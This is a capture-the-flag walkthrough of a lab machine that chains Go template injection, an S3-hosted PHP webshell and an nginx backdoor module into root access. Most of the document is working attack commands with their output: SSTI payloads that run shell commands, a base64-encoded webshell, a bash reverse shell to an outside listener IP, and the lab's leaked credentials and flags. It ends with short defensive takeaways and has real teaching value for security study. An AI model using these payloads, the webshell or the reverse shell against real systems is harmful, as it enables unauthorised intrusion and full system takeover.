Phase 1

Go SSTI → Container RCE

Template Injection in /forgot/

# Test SSTI — {{.}} dumps the template context object
$ curl -s http://10.129.95.236:8080/forgot/ -d 'email={{.}}' -X POST
{ippsec@hacking.esports ippsSecretPassword 0xc0003ec0f0}
Go SSTI vs Jinja2 SSTI Go templates use {{.}} to access the current object and {{.Method "arg"}} to call methods. Unlike Jinja2's {{7*7}}, Go SSTI depends entirely on what methods the template's data object exposes. Here, the User object has a DebugCmd method that calls exec.Command(). 
# Login with leaked creds, then use DebugCmd for RCE
$ curl -s http://10.129.95.236:8080/forgot/ \
    -d 'email={{.DebugCmd "id"}}' -X POST
uid=0(root) gid=0(root)

We're root — but inside a container, not the host. The host's website on port 80 is served from an S3 bucket.

Phase 2

S3 Escape — Container to Host

Upload Webshell via S3

# Step 1: Write PHP webshell to /tmp (base64 to avoid special char issues)
$ curl -s http://10.129.95.236:8080/forgot/ \
    -d 'email={{.DebugCmd "echo -n PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pgo= | base64 -d > /tmp/shell.php"}}' \
    -X POST

# Step 2: Upload from container to S3 bucket (serves port 80)
$ curl -s http://10.129.95.236:8080/forgot/ \
    -d 'email={{.DebugCmd "aws s3 cp /tmp/shell.php s3://website/shell.php"}}' \
    -X POST

# Step 3: Execute on host via port 80
$ curl -s "http://10.129.95.236/shell.php?cmd=id"
uid=33(www-data)

# Get reverse shell on host
$ curl -s "http://10.129.95.236/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.15/4444+0>%261'"

$ nc -lnvp 4444
www-data@gobox:~$ cat user.txt
e366bfbe0dfad319f1881196dfa06d12
Why this works The S3 bucket website is the document root for the nginx server on port 80. Writing a PHP file to the bucket makes it accessible as a web page. Since nginx is configured to process .php files through PHP-FPM, our webshell executes on the host — not in the container.
Phase 3

Privilege Escalation — nginx Backdoor Module

Discovering the Backdoor

www-data@gobox:~$ ls -la /etc/nginx/modules-enabled/
-rw-r--r-- 1 root root 48 ... 50-backdoor.conf

www-data@gobox:~$ cat /etc/nginx/modules-enabled/50-backdoor.conf
load_module modules/ngx_http_execute_module.so;

This is a third-party nginx module that allows command execution via HTTP. The parameter name has been customized. Use strings to find it:

www-data@gobox:~$ strings /usr/lib/nginx/modules/ngx_http_execute_module.so \
    | grep -i "cmd\|exec\|run\|header\|param"
ippsec.run

Root Command Execution

nginx runs as root. The backdoor module listens on 127.0.0.1:8000:

www-data@gobox:~$ curl --globoff "http://127.0.0.1:8000/?ippsec.run[id]"
uid=0(root) gid=0(root) groups=0(root)

www-data@gobox:~$ curl --globoff "http://127.0.0.1:8000/?ippsec.run[cat%20/root/root.txt]"
cfb08bdfbf2771066ad291da722d4418
Why --globoff? curl normally interprets [] as URL globbing ranges. --globoff disables this, allowing the brackets to be sent literally as part of the query parameter — which is the syntax this nginx module expects.
Appendix

Key Takeaways

Go SSTI depends on exposed methods.

{{.}} dumps the object, {{.MethodName "arg"}} calls methods. The danger depends entirely on what the developer attached to the template context.

S3 bucket = website document root = webshell path.

If an S3 bucket serves a website, writing to the bucket means uploading executable code to the web server.

nginx third-party modules are hidden backdoors.

strings analysis on .so files reveals custom parameter names. Always check /etc/nginx/modules-enabled/ for unusual modules.

"Localhost only" is not a security boundary.

The backdoor was bound to 127.0.0.1:8000 — invisible from outside, but accessible to any user with a shell on the box.
